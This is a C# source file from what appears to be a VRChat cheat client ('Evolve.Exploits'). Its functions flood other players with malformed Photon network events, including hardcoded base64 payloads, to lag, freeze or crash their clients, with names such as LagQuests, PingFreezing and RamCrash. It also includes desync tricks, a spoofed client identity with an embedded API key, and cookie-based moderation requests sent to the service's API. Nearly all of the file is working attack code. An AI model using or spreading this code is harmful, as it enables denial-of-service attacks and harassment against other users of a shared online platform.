using Evolve.Utils;
using Evolve.Wrappers;
using ExitGames.Client.Photon;
using Harmony;
using Photon.Pun;
using UnhollowerBaseLib;
using VRC;
using VRC.SDKBase;
using UnityEngine;
using UnityEngine.UI;
using Evolve.ConsoleUtils;
using ButtonApi;
using System.Collections.Generic;
using System.Linq;
using System.Collections;
using Photon.Realtime;
using System.Text;
using System.IO;
using static VRC.SDKBase.VRC_EventHandler;
using Resources = UnityEngine.Resources;
using System;
using Newtonsoft.Json;
using VRC.Core;
using System.Net;

namespace Evolve.Exploits
{
    internal class Events
    {
        public static string XClientVersion = "2021.2.4p3-1110--Release";
        public static string XMacAddress = "53b743b2aa3a376c6a5d12f69b66cffc627e500e";
        public static string XPlatform = "standalonewindows";
        public static string XRequestedWith = "XMLHttpRequest";

        public static void OpRaiseEvent(byte code, object customObject, RaiseEventOptions RaiseEventOptions, SendOptions sendOptions)
        {
            Il2CppSystem.Object Object = Patch.Serialize.FromManagedToIL2CPP<Il2CppSystem.Object>(customObject);
            PhotonNetwork.Method_Private_Static_Boolean_Byte_Object_RaiseEventOptions_SendOptions_0(code, Object, RaiseEventOptions, sendOptions);
        }

        public static void TransferDesync()
        {
            List<VRC_Pickup> AllPickups = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
            if (AllPickups == null) return;
            foreach (var Pickups in AllPickups)
            {
                foreach (var Player in Wrappers.Utils.PlayerManager.AllPlayers())
                {
                    Networking.SetOwner(Player.field_Private_VRCPlayerApi_0, Pickups.gameObject);
                }
            }
        }

     
        public static List<byte[]> AllBytes = new List<byte[]>();

        public static byte[] Emojis;
        public static byte[] Emotes;
        public static byte[] PingFreeze;
#pragma warning disable CS0649 // Le champ 'Events.Voice1' n'est jamais assigné et aura toujours sa valeur par défaut null
        public static byte[] Voice1;
#pragma warning restore CS0649 // Le champ 'Events.Voice1' n'est jamais assigné et aura toujours sa valeur par défaut null
        public static byte[] InvalidBloop;
        public static byte[] Event9Byte;
        public static byte[] USpeakSenderRPC;
        public static Il2CppStructArray<int> Targets;

        public static readonly byte[] randomBytes = new byte[]
        {
            9, // string
            106, // dfzdfzdfdfzf
            112, // gameobject
            7, // int64
            101, // vector3
            104, // color
            8, // boolean
            107, // videoentry
            6, // int16
            105, // color32
            4, // single
            3, // double
            10, // object[]
            11, // ilist
        };

        public static IEnumerator StressTestEvent(int Amount)
        {
            yield return new WaitForEndOfFrame();
            List<byte> AllBytes = new List<byte>();
            byte PreviousByte = 0;
            while (AllBytes.Count != Amount)
            {
                var Byte = randomBytes[new System.Random().Next(13)];
                if (Byte != PreviousByte)
                {
                    AllBytes.Add(Byte);
                    EvoConsole.LogSuccess($"Added: {Byte}");
                }
                PreviousByte = Byte;
                yield return new WaitForEndOfFrame();
            }
            EvoConsole.Log($"Total bytes: {AllBytes.Count}");
            byte[] ByteArray = AllBytes.ToArray();

            OpRaiseEvent(6, ByteArray, new RaiseEventOptions
            {
                field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
            }, default);


        }

        public static void Event5(int ActorNumber)
        {
            Targets = new Il2CppStructArray<int>(1);
            Targets[0] = ActorNumber;
            for (int I = 0; I < 500; I++)
            {
                OpRaiseEvent(5, null, new RaiseEventOptions
                {
                    field_Public_ArrayOf_Int32_0 = Targets,
                    field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                }, default);
            }
        }

        public static void Moderate(string Type, string Cookie, string UserID)
        {
            HttpWebRequest Request = (HttpWebRequest)WebRequest.Create($"https://api.vrchat.cloud/api/1/auth/user/unplayermoderate?apiKey=JlE5Jldo5Jibnk5O5hTx6XVqsJu4WJ26&organization=vrchat");
            Request.Method = "POST";
            Request.Headers.Add("Accept-Encoding", "gzip, identity");
            Request.KeepAlive = true;
            Request.Connection = "TE";
            Request.Headers.Add("Cookie", Cookie);
            Request.Host = "api.vrchat.cloud";
            Request.Headers.Add("Origin", "vrchat.com");
            Request.Headers.Add("TE", "identity");
            Request.Headers.Add("X-Client-Version", XClientVersion);
            Request.Headers.Add("X-MacAddress", XMacAddress);
            Request.Headers.Add("X-Platform", XPlatform);
            Request.Headers.Add("X-Requested-With", XRequestedWith);
            Request.UserAgent = "VRC.Core.BestHTTP";

            var Object = new
            {
                created = "01/01/0001 00:00:00",
                moderated = UserID,
                type = Type
            };
            var Json = JsonConvert.SerializeObject(Object, Formatting.Indented);
            byte[] ByteArray = Encoding.ASCII.GetBytes(Json);

            Request.ContentLength = ByteArray.Length;

            try
            {
                var Stream = Request.GetRequestStream();
                Stream.Write(ByteArray, 0, ByteArray.Length);
                WebResponse webResponse = Request.GetResponse();
                StreamReader sr = new StreamReader(webResponse.GetResponseStream());
                EvoConsole.Log(sr.ReadToEnd());
                if (Stream != null) Stream.Close();
            }
            catch { }
        }

        public static void Unmoderate(string Type, string Cookie, string UserID)
        {
            HttpWebRequest Request = (HttpWebRequest)WebRequest.Create($"https://api.vrchat.cloud/api/1/auth/user/unplayermoderate?apiKey=JlE5Jldo5Jibnk5O5hTx6XVqsJu4WJ26&organization=vrchat");
            Request.Method = "POST";
            Request.Headers.Add("Accept-Encoding", "gzip, identity");
            Request.KeepAlive = true;
            Request.Connection = "TE";
            Request.Headers.Add("Cookie", Cookie);
            Request.Host = "api.vrchat.cloud";
            Request.Headers.Add("Origin", "vrchat.com");
            Request.Headers.Add("TE", "identity");
            Request.Headers.Add("X-Client-Version", XClientVersion);
            Request.Headers.Add("X-MacAddress", XMacAddress);
            Request.Headers.Add("X-Platform", XPlatform);
            Request.Headers.Add("X-Requested-With", XRequestedWith);
            Request.UserAgent = "VRC.Core.BestHTTP";

            var Object = new
            {
                moderated = UserID,
                type = Type
            };
            var Json = JsonConvert.SerializeObject(Object, Formatting.Indented);
            byte[] ByteArray = Encoding.ASCII.GetBytes(Json);

            Request.ContentLength = ByteArray.Length;

            try
            {
                var Stream = Request.GetRequestStream();
                Stream.Write(ByteArray, 0, ByteArray.Length);
                WebResponse webResponse = Request.GetResponse();
                StreamReader sr = new StreamReader(webResponse.GetResponseStream());
                EvoConsole.Log(sr.ReadToEnd());
                if (Stream != null) Stream.Close();
            }
            catch { }
        }

        public static void UnBlock(string UserID)
        {
            //Unmoderate("block", $"auth={ApiCredentials.GetAuthToken()}", UserID);
            OpRaiseEvent(33, new Dictionary<byte, object>
            {
                { 3, false },
                { 0, (byte)22 },
                { 1, UserID },
            }, new RaiseEventOptions()
            {
                field_Public_EventCaching_0 = EventCaching.DoNotCache,
                field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
            }, new SendOptions()
            {
                DeliveryMode = DeliveryMode.Reliable,
                Reliability = true,
                Encrypt = false,
                Channel = 0,
            });
        }

        public static void Block(string UserID)
        {
            //Moderate("block", $"auth={ApiCredentials.GetAuthToken()}", UserID);
            OpRaiseEvent(33, new Dictionary<byte, object>
            {
                { 3, true },
                { 0, (byte)22 },
                { 1, UserID },
            }, new RaiseEventOptions()
            {
                field_Public_EventCaching_0 = EventCaching.DoNotCache,
                field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
            }, new SendOptions()
            {
                DeliveryMode = DeliveryMode.Reliable,
                Reliability = true,
                Encrypt = false,
                Channel = 0,
            });
        }

        public static IEnumerator Event4(int ActorNumber)
        {
            Targets = new Il2CppStructArray<int>(1);
            Targets[0] = ActorNumber;
            if (USpeakSenderRPC == null && File.Exists("Evolve/Events/USpeakSenderRPC.txt")) USpeakSenderRPC = File.ReadAllBytes("Evolve/Events/USpeakSenderRPC.txt");
            if (InvalidBloop == null && File.Exists("Evolve/Events/InvalidBloop.txt")) InvalidBloop = File.ReadAllBytes("Evolve/Events/InvalidBloop.txt");
            if (Emojis == null && File.Exists("Evolve/Events/Emojis.txt")) Emojis = File.ReadAllBytes("Evolve/Events/Emojis.txt");
            if (Emotes == null && File.Exists("Evolve/Events/Emotes.txt")) Emotes = File.ReadAllBytes("Evolve/Events/Emotes.txt");
            /*var Bytes = new List<byte[]>()
            {
                 USpeakSenderRPC,
                InvalidBloop,
                Emojis,
                Emotes
            };*/
            byte[][] Bytes = new byte[][]
            {
                USpeakSenderRPC,
                InvalidBloop,
                Emojis,
                Emotes
            };
            var TimeToFuck = Time.time + 10;

            while (Time.time < TimeToFuck)
            {
                yield return new WaitForEndOfFrame();
                for (int I = 0; I < 200; I++)
                {
                    OpRaiseEvent(4, Bytes, new RaiseEventOptions
                    {
                        field_Public_ArrayOf_Int32_0 = Targets,
                        field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                    }, default);
                }
            }
        }

        public static void Event9()
        {
            if (Event9Byte == null && File.Exists("Evolve/Events/9.txt")) Event9Byte = File.ReadAllBytes("Evolve/Events/9.txt");
            for (int I = 0; I < 100; I++)
            {
                OpRaiseEvent(9, Event9Byte, new RaiseEventOptions
                {
                    field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                }, default);
            }
        }

        public static IEnumerator InvalidCameraBloop()
        {
            yield return new WaitForEndOfFrame();
            if (InvalidBloop == null && File.Exists("Evolve/Events/InvalidBloop.txt")) InvalidBloop = File.ReadAllBytes("Evolve/Events/InvalidBloop.txt");
            for (int I = 0; I < 100; I++)
            {
                OpRaiseEvent(6, InvalidBloop, new RaiseEventOptions
                {
                    field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                }, default);
            }
        }

        public static void PingFreezing()
        {
            if (PingFreeze == null && File.Exists("Evolve/Events/PingFreeze.txt")) PingFreeze = File.ReadAllBytes("Evolve/Events/PingFreeze.txt");
            OpRaiseEvent(7, PingFreeze, new RaiseEventOptions
            {
                field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
            }, default);
        }

        public static void LagMaster()
        {
            if (Emojis == null && File.Exists("Evolve/Events/Emojis.txt")) Emojis = File.ReadAllBytes("Evolve/Events/Emojis.txt");
            if (Emotes == null && File.Exists("Evolve/Events/Emotes.txt")) Emotes = File.ReadAllBytes("Evolve/Events/Emotes.txt");
            for (int I = 0; I < 50; I++)
            {
                OpRaiseEvent(6, Emotes, new RaiseEventOptions
                {
                    field_Public_ReceiverGroup_0 = ReceiverGroup.MasterClient,
                }, default);

                OpRaiseEvent(6, Emojis, new RaiseEventOptions
                {
                    field_Public_ReceiverGroup_0 = ReceiverGroup.MasterClient,
                }, default);
            }
        }

        public static IEnumerator LagQuests()
        {
            var Bloop = "ap+OCswBAAAAJAA6MTg2QTEvVXNlckNhbWVyYUluZGljYXRvci9JbmRpY2F0b3IOAP8AAAAAAAAAAAoAVGltZXJCbG9vcAAAAAAEAAAL";
            var Bytes = Convert.FromBase64String(Bloop);
            while (Settings.QuestLagger)
            {
                yield return new WaitForEndOfFrame();
                for (int I = 0; I < 306; I++)
                {
                    OpRaiseEvent(6, Bytes, new RaiseEventOptions
                    {
                        field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                    }, default);
                }
            }
            yield break;
        }

        public static IEnumerator Event1()
        {
            var Bytes = File.ReadAllBytes("Evolve/Events/LongEmotes.txt").ToList();
            for (int I = 0; I < 50; I++)
            {
                OpRaiseEvent(6, Bytes, new RaiseEventOptions
                {
                    field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                }, default);
            }
            yield return null;
        }

        public static IEnumerator Event1Long()
        {
            string LongUSpeak = "cGtoaWsKB2oIAwYJAwdraARwCmVwawNpamgHBggDcAloaWsKBHAIZWkJAwdqaAQGCWVwa2hpagplBggDaQloBwYKBHAJZWlrAwdqCGUGCQNwa2gEawplcAgDaWoDBwYIBHAJZXBrCgRqCGUGCAMHamgEBgoEcGtlaWoKB2oIAwYJaAdraARqCmVpawNpamgHBgkEcAloaWsKZWoIZWkJAwdraAQGCWVwawNpagoHBggDcAloB2sKBHAIZWlrAwdqCAQGCQNwa2gEagplcAgDaQloBwYIBHAJZWlrCmlqCGUGCQMHCWgEBgplcAhlaWoKBwYIBAYJaAdrCgRqCmVpCAMHamgHBgkEcGtoaWsKB2oIA2kJAwdraARwCmVwawNpaggHBggDcAloaWsKBHAIZWkJAwdqaAQGCWVwa2hpagplBggDaQloBwYKBHAJZWlrCgdqCGUGCQNwa2gEBgplcAgDaWoDBwYIBHAJaHBrCgRqCGUGCAMHamgEBgoEcGtoaWoKB2oIAwYJaAdraARwCmVpawNpamgHBgkDcAloaWsKZWoIZWkJAwcGaAQGCWVwawNpagplBggDcAloB2sKBHAIZWlrAwdqCAQGCQNwa2gEagplcAgDaWpoBwYIBHAJZWlrCgRqCGUGCQMHCWgEBgplcGs=";

            var Bytes = Convert.FromBase64String(LongUSpeak);

            var TimeToSpam = Time.time + 20;

            while (Time.time < TimeToSpam)
            {
                yield return new WaitForSeconds(1);
                for (int I = 0; I < 50; I++)
                {
                    OpRaiseEvent(1, Bytes, new RaiseEventOptions
                    {
                        field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                    }, default);
                }
            }
            yield return null;
        }

        public static IEnumerator Event6Long()
        {
            string LongUSpeak = "";

            var Bytes = Convert.FromBase64String(LongUSpeak);

            var TimeToSpam = Time.time + 20;

            OpRaiseEvent(6, Bytes, new RaiseEventOptions
            {
                field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
            }, default);
            yield return null;
        }

        public static IEnumerator PortalDesync()
        {
            for (; ; )
            {
                if (Settings.DesyncLobby && VRCPlayer.field_Internal_Static_VRCPlayer_0 == true)
                {
                    Functions.DropPortal("wrld_5b89c79e-c340-4510-be1b-476e9fcdedcc", Utils.Utilities.RandomNumberString(5), int.MinValue, new Vector3(0, 0, 0), new Quaternion(0, 0, 0, 0));
                }
                yield return new WaitForEndOfFrame();
            }
        }
        public static IEnumerator FbtDesync()
        {
            for(; ; )
            {
                if (Settings.FbtDesync)
                {
                    var Proxy = GameObject.Find("Toggle_Pickups").transform.Find("Pickup_Toggle_Proxy").GetComponent<VRC_Trigger>();
                    Proxy.Interact();
                    var TriggerDisable = GameObject.Find("Button_Disable_Pickups").transform.Find("Master_Proxy").GetComponent<VRC_Trigger>();
                    TriggerDisable.Interact();
                    var TriggerEnable = GameObject.Find("Button_Enable_Pickups").transform.Find("Master_Proxy").GetComponent<VRC_Trigger>();
                    TriggerEnable.Interact();
                    EvoConsole.Log("Pressed");
                }
                yield return new WaitForEndOfFrame();
            }
        }

        public static void RamCrash()
        {
            foreach (var Player in Wrappers.Utils.PlayerManager.AllPlayers())
            {
                EvoVrConsole.Log(EvoVrConsole.LogsType.Info, Player.DisplayName());
                OpRaiseEvent(33, new Hashtable
                {
                    { "3", true },
                    { "0",22 },
                    { "1", Player.prop_APIUser_0.id}
                },
                new RaiseEventOptions
                {
                    field_Public_ReceiverGroup_0 = ReceiverGroup.Others
                }, new SendOptions
                {
                    Channel = 0,
                    DeliveryMode = DeliveryMode.Reliable,
                    Encrypt = true
                });


                OpRaiseEvent(33, new Hashtable
                {
                    { "3", false },
                    { "0",22 },
                    { "1", Player.prop_APIUser_0.id}
                },
                new RaiseEventOptions
                {
                    field_Public_ReceiverGroup_0 = ReceiverGroup.Others
                }, new SendOptions
                {
                    Channel = 0,
                    DeliveryMode = DeliveryMode.Reliable,
                    Encrypt = true
                });
            }
        }
    }
}